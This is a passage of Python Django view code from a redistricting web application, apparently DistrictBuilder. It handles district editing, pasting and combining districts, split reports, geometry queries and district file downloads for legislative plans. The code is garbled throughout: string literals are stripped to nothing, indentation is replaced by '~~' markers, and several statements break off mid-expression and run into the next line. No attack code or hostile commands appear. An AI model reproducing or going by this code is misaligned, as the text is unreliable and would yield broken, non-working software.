~~ if in request . REQUEST : \n 
~~~ district_short = request . REQUEST [ ] [ 0 : 10 ] \n 
~~ elif not district_id is None : \n 
~~~ district_short = plan . legislative_body . get_short_label ( ) % { : district_id } \n 
~~ else : \n 
~~~ district_short = None \n 
\n 
~~ if in request . REQUEST : \n 
~~~ district_long = request . REQUEST [ ] [ 0 : 256 ] \n 
~~ elif not district_id is None : \n 
~~~ district_long = plan . legislative_body . get_label ( ) % { : district_id } \n 
~~ else : \n 
~~~ district_long = None \n 
\n 
~~ if in request . REQUEST : \n 
~~~ version = request . REQUEST [ ] \n 
~~ else : \n 
~~~ version = plan . version \n 
\n 
~~ if geolevel and geounit_ids and district_id : \n 
~~~ try : \n 
# add the geounits selected to this district -- this will \n 
# create a new district w/1 version higher \n 
~~~ fixed = plan . add_geounits ( ( district_id , district_short , district_long , ) , geounit_ids \n 
# if there are comments, types or multiple members, add them to the district \n 
district = plan . district_set . filter ( district_id = district_id , short_label = district_short if plan . legislative_body . multi_members_allowed : \n 
~~~ district . num_members = plan . legislative_body . min_multi_district_members \n 
district . save ( ) \n 
~~ ct = ContentType . objects . get ( app_label = , model = ) \n 
if in request . POST and request . POST [ ] != : \n 
~~~ comment = Comment ( \n 
object_pk = district . id , \n 
content_type = ct , \n 
site_id = Site . objects . get_current ( ) . id , \n 
user_name = request . user . username , \n 
user_email = request . user . email , \n 
comment = request . POST [ ] ) \n 
comment . save ( ) \n 
\n 
~~ if len ( request . REQUEST . getlist ( ) ) > 0 : \n 
~~~ strtags = request . REQUEST . getlist ( ) \n 
for strtag in strtags : \n 
~~~ if strtag == : \n 
~~~ continue \n 
~~ if strtag . count ( ) > 0 : \n 
~~~ strtag = \'"type=%s"\' % strtag \n 
~~ else : \n 
~~~ strtag = % strtag \n 
~~ Tag . objects . add_tag ( district , strtag ) \n 
\n 
~~ ~~ status [ ] = True \n 
status [ ] = _ ( ) \n 
plan = Plan . objects . get ( pk = planid , owner = request . user ) \n 
status [ ] = getutc ( plan . edited ) . isoformat ( ) \n 
status [ ] = district_id \n 
status [ ] = plan . version \n 
~~ except ValidationError : \n 
~~~ status [ ] = _ ( ) \n 
~~ except Exception , ex : \n 
~~~ logger . warn ( ) \n 
logger . debug ( , ex ) \n 
status [ ] = _ ( "Couldn\'t save new district." ) \n 
~~ ~~ else : \n 
~~~ status [ ] = _ ( ) \n 
~~ ~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
@ transaction . commit_manually \n 
def add_districts_to_plan ( request , planid ) : \n 
~~~ """\n    This handler is used to paste existing districts from one\n    plan into another plan\n    \n    Parameters:\n        request -- An HttpRequest object including a list of districtids and\n            a version\n        planid -- The plan into which to paste the districts\n\n    Returns:\n        Some JSON explaining the success or failure of the paste operation\n    """ \n 
\n 
status = { : False } \n 
\n 
# Make sure we can edit the given plan \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_edit ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t edit the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Get the districts we want to merge \n 
~~ district_list = request . POST . getlist ( ) \n 
if len ( district_list ) == 0 : \n 
~~~ status [ ] = _ ( "No districts selected to add to the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
~~ else : \n 
~~~ districts = District . objects . filter ( id__in = district_list ) \n 
version = int ( request . POST . get ( , None ) ) \n 
status [ ] = _ ( ) % { : len ( districts ) } \n 
\n 
# Check to see if we have enough room to add these districts without \n 
# going over MAX_DISTRICTS for the legislative_body \n 
~~ allowed_districts = plan . get_available_districts ( version = version ) \n 
\n 
if len ( districts ) > allowed_districts : \n 
~~~ status [ ] = _ ( ) % { : allowed_districts } \n 
\n 
\n 
~~ try : \n 
~~~ results = plan . paste_districts ( districts , version = version ) \n 
transaction . commit ( ) \n 
status [ ] = True \n 
status [ ] = _ ( ) % { status [ ] = plan . version \n 
~~ except Exception as ex : \n 
~~~ transaction . rollback ( ) \n 
status [ ] = str ( ex ) \n 
status [ ] = traceback . format_exc ( ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
@ transaction . commit_manually \n 
def assign_district_members ( request , planid ) : \n 
~~~ """\n    This handler is used to assign members to districts\n    \n    Parameters:\n        request -- An HttpRequest object including a version,\n                   and a mapping of districtids to num_members\n        planid -- The plan into which to assign district members\n\n    Returns:\n        Some JSON explaining the success or failure of the paste operation\n    """ \n 
\n 
status = { : False } \n 
\n 
# Make sure we can edit the given plan \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_edit ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t edit the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Make sure this district allows multi-member assignment \n 
~~ leg_bod = plan . legislative_body \n 
if ( not leg_bod . multi_members_allowed ) : \n 
~~~ status [ ] = _ ( \n 
) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Get the districts we want to assign members to \n 
~~ districts = request . POST . getlist ( ) \n 
counts = request . POST . getlist ( ) \n 
version = int ( request . POST . get ( , None ) ) \n 
\n 
# Assign the district members and return status \n 
try : \n 
~~~ changed = 0 \n 
for i in range ( 0 , len ( districts ) ) : \n 
~~~ id = int ( districts [ i ] ) \n 
count = int ( counts [ i ] ) \n 
district = District . objects . filter ( plan = plan , district_id = id , version__lte = version ) . order_by \n 
if district . num_members != count : \n 
~~~ if ( changed == 0 ) : \n 
# If there is at least one change, update the plan \n 
~~~ if version != plan . version : \n 
~~~ plan . purge ( after = version ) \n 
\n 
~~ plan . version = plan . version + 1 \n 
plan . save ( ) \n 
\n 
~~ plan . update_num_members ( district , count ) \n 
changed += 1 \n 
\n 
~~ ~~ transaction . commit ( ) \n 
status [ ] = True \n 
status [ ] = plan . version \n 
status [ ] = changed \n 
status [ ] = _ ( \n 
) % { : changed } \n 
~~ except Exception , ex : \n 
~~~ transaction . rollback ( ) \n 
status [ ] = str ( ex ) \n 
status [ ] = traceback . format_exc ( ) \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def combine_districts ( request , planid ) : \n 
~~~ """\n    Take the contents of one district and add them to another districts\n    """ \n 
\n 
status = { : False } \n 
\n 
# Make sure we can edit the given plan \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_edit ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t edit the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Get the districts we want to merge \n 
~~ version = int ( request . POST . get ( , plan . version ) ) \n 
from_id = int ( request . POST . get ( , - 1 ) ) \n 
to_id = int ( request . POST . get ( , None ) ) \n 
\n 
try : \n 
~~~ all_districts = plan . get_districts_at_version ( version , include_geom = True ) \n 
\n 
from_districts = filter ( lambda d : True if d . district_id == from_id else False , all_districts to_district = filter ( lambda d : True if d . district_id == to_id else False , all_districts ) [ 0 ] \n 
\n 
locked = to_district . is_locked \n 
for district in from_districts : \n 
~~~ if district . is_locked : \n 
~~~ locked = True \n 
\n 
~~ ~~ if locked : \n 
~~~ status [ ] = _ ( "Can\'t combine locked districts" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ result = plan . combine_districts ( to_district , from_districts , version = version ) \n 
\n 
if result [ 0 ] == True : \n 
~~~ status [ ] = True \n 
status [ ] = _ ( ) \n 
status [ ] = result [ 1 ] \n 
~~ ~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = traceback . format_exc ( ) \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def fix_unassigned ( request , planid ) : \n 
~~~ """\n    Assign unassigned base geounits that are fully contained\n    or adjacent to another district\n    """ \n 
\n 
status = { : False } \n 
\n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_edit ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t edit the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ try : \n 
~~~ version = int ( request . POST . get ( , plan . version ) ) \n 
result = plan . fix_unassigned ( version ) \n 
status [ ] = result [ 0 ] \n 
status [ ] = result [ 1 ] \n 
status [ ] = plan . version \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = traceback . format_exc ( ) \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
\n 
~~ @ unique_session_or_json_redirect \n 
def get_splits ( request , planid , otherid , othertype ) : \n 
~~~ """\n    Find all splits between this plan and another plan\n\n    Parameters:\n        request -- An HttpRequest optionally containing version and/or otherversion\n        planid -- The plan ID\n        otherid -- The plan ID or geolevel ID to find splits with\n        othertype -- One of: \'plan\' or \'geolevel\'. For specifying otherid\n\n    Returns:\n        A JSON HttpResponse that contains an array of splits, given as arrays,\n        where the first item is the district_id of the district in this plan\n        which causes the split, and the second item is the district_id of the\n        district in the other plan or geolevel. When a geolevel is specified,\n        the portable_id will be used, rather than the district_id.\n    """ \n 
\n 
otherid = int ( otherid ) \n 
status = { : False } \n 
\n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not can_view ( request . user , plan ) : \n 
~~~ status [ ] = _ ( "User can\'t view the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ version = int ( request . REQUEST [ ] if in request . REQUEST else plan . version ) \n 
try : \n 
~~~ if othertype == : \n 
~~~ try : \n 
~~~ otherplan = Plan . objects . get ( pk = otherid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
~~ if not can_view ( request . user , otherplan ) : \n 
~~~ status [ ] = _ ( "User can\'t view the given plan" ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ otherversion = int ( request . REQUEST [ ] if in request . REQUEST splits = plan . find_plan_splits ( otherplan , version , otherversion ) \n 
~~ elif othertype == : \n 
~~~ splits = plan . find_geolevel_splits ( otherid , version ) \n 
~~ else : \n 
~~~ status [ ] = _ ( ) % { : othertype } \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ split_word = _ ( ) if len ( splits ) == 1 else inflect . engine ( ) . plural ( _ ( ) ) \n 
\n 
status [ ] = True \n 
status [ ] = _ ( ) % { : len ( splits ) , : split_word } \n 
status [ ] = splits \n 
status [ ] = list ( set ( [ i [ 0 ] for i in splits ] ) ) \n 
status [ ] = list ( set ( [ i [ 1 ] for i in splits ] ) ) \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = traceback . format_exc ( ) \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ def get_processing_status ( request ) : \n 
~~~ """\n    Get the processing status for a list of plan ids\n    """ \n 
status = { : False } \n 
plan_ids = request . REQUEST . getlist ( ) \n 
if len ( plan_ids ) == 0 : \n 
~~~ status [ ] = _ ( ) \n 
~~ else : \n 
~~~ statuses = { } \n 
for p in Plan . objects . filter ( id__in = plan_ids ) : \n 
~~~ statuses [ str ( p . id ) ] = p . get_processing_state_display ( ) \n 
\n 
~~ status [ ] = True \n 
status [ ] = statuses \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ def get_splits_report ( request , planid ) : \n 
~~~ """\n    Get the rendered splits report\n    """ \n 
note_session_activity ( request ) \n 
\n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ return HttpResponse ( _ ( ) , mimetype = ) \n 
\n 
~~ if not using_unique_session ( request . user ) or not can_view ( request . user , plan ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ version = int ( request . REQUEST [ ] if in request . REQUEST else plan . version ) \n 
inverse = request . REQUEST [ ] == if in request . REQUEST else False \n 
extended = request . REQUEST [ ] == if in request . REQUEST else False \n 
layers = request . REQUEST . getlist ( ) \n 
if len ( layers ) == 0 : \n 
~~~ return HttpResponse ( _ ( ) , mimetype = ) \n 
\n 
~~ try : \n 
~~~ report = loader . get_template ( ) \n 
html = \n 
for layer in layers : \n 
~~~ my_context = { : extended } \n 
my_context . update ( plan . compute_splits ( layer , version = version , inverse = inverse , extended last_item = layer is layers [ - 1 ] \n 
community_info = plan . get_community_type_info ( layer , version = version , inverse = inverse if community_info is not None : \n 
~~~ my_context . update ( community_info ) \n 
~~ calc_context = DjangoContext ( my_context ) \n 
html += report . render ( calc_context ) \n 
if not last_item : \n 
~~~ html += \n 
~~ ~~ return HttpResponse ( html , mimetype = ) \n 
~~ except Exception , ex : \n 
~~~ logger . warn ( ) \n 
logger . debug ( , ex ) \n 
return HttpResponse ( str ( ex ) , mimetype = ) \n 
\n 
\n 
~~ ~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def addtodistrict ( request , planid , districtid ) : \n 
~~~ """\n    Add geounits to a district.\n\n    This method requires both "geolevel" and "geounits" URL parameters. \n    The geolevel must be a valid geolevel name and the geounits parameters \n    should be a pipe-separated list of geounit ids.\n\n    Parameters:\n        request -- An HttpRequest, with the current user, the geolevel, and\n        the pipe-separated geounit list.\n        planid -- The plan ID that contains the district.\n        districtid -- The district ID to which the geounits will be added.\n\n    Returns:\n        A JSON HttpResponse that contains the number of districts modified,\n        or an error message if adding fails.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
\n 
if len ( request . REQUEST . items ( ) ) >= 2 : \n 
~~~ try : \n 
~~~ geolevel = request . REQUEST [ "geolevel" ] \n 
geounit_ids = string . split ( request . REQUEST [ "geounits" ] , "|" ) \n 
plan = Plan . objects . get ( pk = planid , owner = request . user ) \n 
~~ except : \n 
~~~ status [ ] = traceback . format_exc ( ) \n 
status [ ] = _ ( ) \n 
\n 
# get the version from the request or the plan \n 
~~ if in request . REQUEST : \n 
~~~ version = request . REQUEST [ ] \n 
~~ else : \n 
~~~ version = plan . version \n 
\n 
~~ try : \n 
~~~ fixed = plan . add_geounits ( districtid , geounit_ids , geolevel , version ) \n 
status [ ] = True ; \n 
status [ ] = _ ( ) % { : fixed } \n 
status [ ] = fixed \n 
plan = Plan . objects . get ( pk = planid , owner = request . user ) \n 
status [ ] = getutc ( plan . edited ) . isoformat ( ) \n 
status [ ] = plan . version \n 
~~ except Exception , ex : \n 
~~~ status [ ] = traceback . format_exc ( ) \n 
status [ ] = _ ( ) \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
\n 
~~ ~~ else : \n 
~~~ status [ ] = _ ( "Geounits weren\'t found in a district." ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
@ login_required \n 
def setdistrictlock ( request , planid , district_id ) : \n 
~~~ """\n    Set whether this district is locked for editing.\n\n    Parameters:\n        request -- An HttpRequest, with a boolean that indicates whether the district\n        should be locked or unlocked\n        planid -- The plan ID that contains the district.\n        district_id -- The district_id to lock or unlock\n\n    Returns:\n        A JSON HttpResponse that contains a boolean of whether the district is locked.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
\n 
if request . method != : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ lock = request . POST . get ( ) . lower ( ) == \n 
version = request . POST . get ( ) \n 
if lock == None : \n 
~~~ status [ ] = _ ( ) \n 
~~ elif version == None : \n 
~~~ status [ ] = _ ( ) \n 
\n 
~~ try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
district = plan . district_set . filter ( district_id = district_id , version__lte = version ) . order_by ( ~~ except ObjectDoesNotExist : \n 
~~~ status [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if plan . owner != request . user : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ district . is_locked = lock \n 
district . save ( ) \n 
status [ ] = True \n 
status [ ] = _ ( ) % { : _ ( ) if lock else _ ( ) } \n 
\n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
\n 
~~ @ unique_session_or_json_redirect \n 
def getdistricts ( request , planid ) : \n 
~~~ """\n    Get the districts in a plan at a specific version.\n\n    Parameters:\n        request - An HttpRequest, with the current user.\n        planid - The plan id to query for the districts.\n    Returns:\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
\n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
\n 
if in request . REQUEST : \n 
~~~ version = int ( request . REQUEST [ ] ) \n 
~~ else : \n 
~~~ version = plan . version \n 
\n 
~~ districts = plan . get_districts_at_version ( version , include_geom = False ) \n 
\n 
status [ ] = [ ] \n 
\n 
# Same calculation as plan.get_available_districts, but \n 
# g_a_d fetches districts all over again -- skip that overhead \n 
status [ ] = plan . legislative_body . max_districts - len ( districts ) + 1 \n 
\n 
# Find the maximum version in the returned districts \n 
max_version = max ( [ d . version for d in districts ] ) \n 
\n 
\n 
# equal to the minimum stored version \n 
can_undo = max_version > plan . min_version \n 
\n 
for district in districts : \n 
~~~ status [ ] . append ( { \n 
: district . district_id , \n 
: . join ( map ( _ , district . short_label . split ( ) ) ) , \n 
: . join ( map ( _ , district . long_label . split ( ) ) ) , \n 
: district . version \n 
} ) \n 
~~ status [ ] = can_undo \n 
status [ ] = True \n 
\n 
~~ else : \n 
~~~ status [ ] = _ ( ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
\n 
~~ def simple_district_versioned ( request , planid , district_ids = None ) : \n 
~~~ """\n    Emulate a WFS service for versioned districts.\n\n    This function retrieves one version of the districts in a plan, with\n    the value of the subject attached to the feature. This function is\n    necessary because a traditional view could not be used to get the\n    districts in a versioned fashion.\n\n    This method accepts \'version__eq\' and \'subjects__eq\' URL parameters.\n\n    This method accepts an optional \'district_ids__eq\' parameter, which is\n    a comma-separated list of district_ids to filter by\n\n    Parameters:\n        request -- An HttpRequest, with the current user.\n        planid -- The plan ID from which to get the districts.\n\n    Returns:\n        A GeoJSON HttpResponse, describing the districts in the plan.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : } \n 
\n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
if in request . REQUEST : \n 
~~~ version = request . REQUEST [ ] \n 
~~ else : \n 
~~~ version = plan . version \n 
\n 
~~ subject_id = None \n 
if in request . REQUEST : \n 
~~~ subject_id = request . REQUEST [ ] \n 
~~ elif plan . legislative_body . get_default_subject ( ) : \n 
~~~ subject_id = plan . legislative_body . get_default_subject ( ) . id \n 
\n 
~~ geolevel = plan . legislative_body . get_geolevels ( ) [ 0 ] . id \n 
if in request . REQUEST : \n 
~~~ geolevel = int ( request . REQUEST [ ] ) \n 
\n 
~~ if in request . REQUEST : \n 
~~~ district_ids = request . REQUEST [ ] \n 
if len ( district_ids ) > 0 : \n 
~~~ district_ids = district_ids . split ( ) \n 
~~ else : \n 
~~~ district_ids = [ ] \n 
\n 
~~ ~~ if subject_id : \n 
~~~ bbox = None \n 
if in request . REQUEST : \n 
~~~ bbox = request . REQUEST [ ] \n 
# convert the request string into a tuple full of floats \n 
bbox = tuple ( map ( lambda x : float ( x ) , bbox . split ( ) ) ) \n 
~~ else : \n 
~~~ bbox = plan . district_set . all ( ) . extent ( field_name = ) \n 
\n 
~~ status [ ] = plan . get_wfs_districts ( version , subject_id , bbox , geolevel , district_ids ~~ else : \n 
~~~ status [ ] = [ ] \n 
status [ ] = _ ( ) \n 
~~ ~~ else : \n 
~~~ status [ ] = [ ] \n 
status [ ] = _ ( ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
\n 
~~ def get_unlocked_simple_geometries ( request , planid ) : \n 
~~~ """\n    Emulate a WFS service for selecting unlocked geometries.\n\n    This function retrieves all unlocked geometries within a geolevel\n    for a given plan. This function is necessary because a traditional\n    view could not be used to obtain the geometries in a versioned fashion.\n\n    This method accepts \'version__eq\', \'level__eq\', and \'geom__eq\' URL parameters.\n\n    Parameters:\n    request -- An HttpRequest, with the current user.\n    planid -- The plan ID from which to get the districts.\n\n    Returns:\n    A GeoJSON HttpResponse, describing the unlocked simplified geometries\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : } \n 
\n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
version = request . POST . get ( , plan . version ) \n 
geolevel = request . POST . get ( , plan . legislative_body . get_geolevels ( ) [ 0 ] . id ) \n 
geom = request . POST . get ( , None ) \n 
if geom is not None : \n 
~~~ try : \n 
~~~ wkt = request . POST . get ( , None ) \n 
geom = GEOSGeometry ( wkt ) \n 
\n 
~~ except GEOSException : \n 
~~~ wkt = request . REQUEST [ ] . replace ( , ) \n 
wkt = wkt . replace ( , ) . replace ( , ) \n 
try : \n 
~~~ geom = GEOSGeometry ( wkt ) \n 
~~ except GEOSException : \n 
\n 
~~~ geom = None \n 
\n 
# Selection is the geounits that intersects with the drawing tool used: \n 
# either a lasso, a rectangle, or a point \n 
~~ ~~ selection = Q ( geom__intersects = geom ) \n 
\n 
# Create a union of locked geometries \n 
districts = [ d . id for d in plan . get_districts_at_version ( version , include_geom = True ) if locked = District . objects . filter ( id__in = districts ) . collect ( ) \n 
\n 
# Create a simplified locked boundary for fast, but not completely accurate lookups \n 
# Note: the preserve topology parameter of simplify is needed here \n 
locked_buffered = locked . simplify ( 100 , True ) . buffer ( 100 ) if locked else None \n 
\n 
# Filter first by geolevel, then selection \n 
filtered = Geolevel . objects . get ( id = geolevel ) . geounit_set . filter ( selection ) \n 
# Assemble the matching features into geojson \n 
features = [ ] \n 
for feature in filtered : \n 
# We want to allow for the selection of a geometry that is partially split \n 
# with a locked district, so subtract out all sections that are locked \n 
~~~ geom = feature . simple \n 
\n 
# Only perform additional tests if the fast, innacurate lookup passed \n 
if locked and geom . intersects ( locked_buffered ) : \n 
\n 
\n 
~~~ if feature . geom . within ( locked ) : \n 
~~~ continue \n 
\n 
# Overlapping geometries are the ones we need to subtract pieces of \n 
~~ if feature . geom . overlaps ( locked ) : \n 
# Since this is just for display, do the difference on the simplified geometries ~~~ geom = geom . difference ( locked_buffered ) \n 
\n 
~~ ~~ features . append ( { \n 
# Note: OpenLayers breaks when the id is set to an integer, or even an integer string. # The id ends up being treated as an array index, rather than a property list key, and \n 
: % feature . id , \n 
: json . loads ( geom . json ) , \n 
: { \n 
: feature . name , \n 
: geolevel , \n 
: feature . id \n 
} \n 
} ) \n 
\n 
~~ status [ ] = features \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ else : \n 
~~~ status [ ] = [ ] \n 
status [ ] = _ ( ) \n 
\n 
~~ ~~ else : \n 
~~~ status [ ] = [ ] \n 
status [ ] = _ ( ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def get_statistics ( request , planid ) : \n 
~~~ note_session_activity ( request ) \n 
\n 
status = { : False } \n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
~~ except : \n 
~~~ status [ ] = _ ( \n 
"Couldn\'t get geography info from the server. No plan with the given id." ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = , status = 500 ) \n 
\n 
~~ if in request . REQUEST : \n 
~~~ try : \n 
~~~ version = int ( request . REQUEST [ ] ) \n 
~~ except : \n 
~~~ version = plan . version \n 
~~ ~~ else : \n 
~~~ version = plan . version \n 
\n 
~~ try : \n 
~~~ display = ScoreDisplay . objects . get ( legislative_body = plan . legislative_body , name = "%s_sidebar_demo" ~~ except : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = traceback . format_exc ( ) \n 
\n 
~~ if in request . REQUEST : \n 
~~~ try : \n 
~~~ display = ScoreDisplay . objects . get ( pk = request . POST [ ] ) \n 
~~ except : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = traceback . format_exc ( ) \n 
\n 
~~ ~~ else : \n 
~~~ logger . warn ( ) \n 
logger . warn ( str ( request . POST ) ) \n 
\n 
~~ try : \n 
~~~ html = display . render ( plan , request , version = version ) \n 
return HttpResponse ( html , mimetype = ) \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( "Couldn\'t render display tab." ) \n 
status [ ] = traceback . format_exc ( ) \n 
logger . warn ( "Couldn\'t render display tab" ) \n 
logger . debug ( , ex ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = , status = 500 ) \n 
\n 
\n 
~~ ~~ def getutc ( t ) : \n 
~~~ """\n    Given a datetime object, translate to a datetime object for UTC time.\n    """ \n 
t_tuple = t . timetuple ( ) \n 
t_seconds = time . mktime ( t_tuple ) \n 
return t . utcfromtimestamp ( t_seconds ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def getdistrictfilestatus ( request , planid ) : \n 
~~~ """\n    Given a plan id, return the status of the district index file\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
plan = Plan . objects . get ( pk = planid ) \n 
if not can_copy ( request . user , plan ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
~~ try : \n 
~~~ is_shape = in request . REQUEST and request . REQUEST [ ] == \n 
file_status = DistrictFile . get_file_status ( plan , shape = is_shape ) \n 
status [ ] = True \n 
status [ ] = file_status \n 
~~ except Exception as ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = ex \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def getdistrictfile ( request , planid ) : \n 
~~~ """\n    Given a plan id, email the user a zipped copy of \n    the district index file\n    """ \n 
note_session_activity ( request ) \n 
\n 
# Get the districtindexfile and create a response \n 
plan = Plan . objects . get ( pk = planid ) \n 
if not can_copy ( request . user , plan ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ is_shape = in request . REQUEST and request . REQUEST [ ] == \n 
file_status = DistrictFile . get_file_status ( plan , shape = is_shape ) \n 
if file_status == : \n 
~~~ if is_shape : \n 
~~~ archive = DistrictShapeFile . plan2shape ( plan ) \n 
~~ else : \n 
~~~ archive = DistrictIndexFile . plan2index ( plan ) \n 
~~ response = HttpResponse ( open ( archive . name ) . read ( ) , content_type = ) \n 
response [ ] = \'attachment; filename="%s.zip"\' % plan . get_friendly_name ( ) ~~ else : \n 
# Put in a celery task to create this file \n 
~~~ if is_shape : \n 
~~~ DistrictShapeFile . plan2shape . delay ( plan ) \n 
~~ else : \n 
~~~ DistrictIndexFile . plan2index . delay ( plan ) \n 
~~ response = HttpResponse ( _ ( \n 
) ) \n 
~~ return response \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def emaildistrictindexfile ( request , planid ) : \n 
~~~ """\n    Given a plan id, email a zipped copy of the district \n    index file to a specified address\n    """ \n 
note_session_activity ( request ) \n 
\n 
if request . method != : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ plan = Plan . objects . get ( pk = planid ) \n 
if not can_copy ( request . user , plan ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
# Put in a celery task to create the file and send the emails \n 
~~ DistrictIndexFile . emailfile . delay ( plan , request . user , request . POST , translation . get_language ( ) ) \n 
return HttpResponse ( json . dumps ( { \n 
: True , \n 
: _ ( ) } ) , \n 
mimetype = ) \n 
\n 
~~ def getvalidplans ( leg_body , owner = None ) : \n 
~~~ """\n    Returns the valid plans for a given legislative body and owner (optional)\n    """ \n 
pfilter = Q ( legislative_body = leg_body ) & Q ( is_valid = True ) \n 
if owner is not None : \n 
~~~ pfilter = pfilter & Q ( owner = owner ) \n 
\n 
~~ return list ( Plan . objects . filter ( pfilter ) ) \n 
\n 
~~ def getleaderboarddisplay ( leg_body , owner_filter ) : \n 
~~~ """\n    Returns the leaderboard ScoreDisplay given a legislative body and owner\n    """ \n 
try : \n 
~~~ return ScoreDisplay . objects . get ( name = "%s_leader_%s" % ( leg_body . name , owner_filter ) ) \n 
~~ except : \n 
~~~ return None \n 
\n 
~~ ~~ def getleaderboard ( request ) : \n 
~~~ """\n    Get the rendered leaderboard\n    """ \n 
note_session_activity ( request ) \n 
\n 
if not using_unique_session ( request . user ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
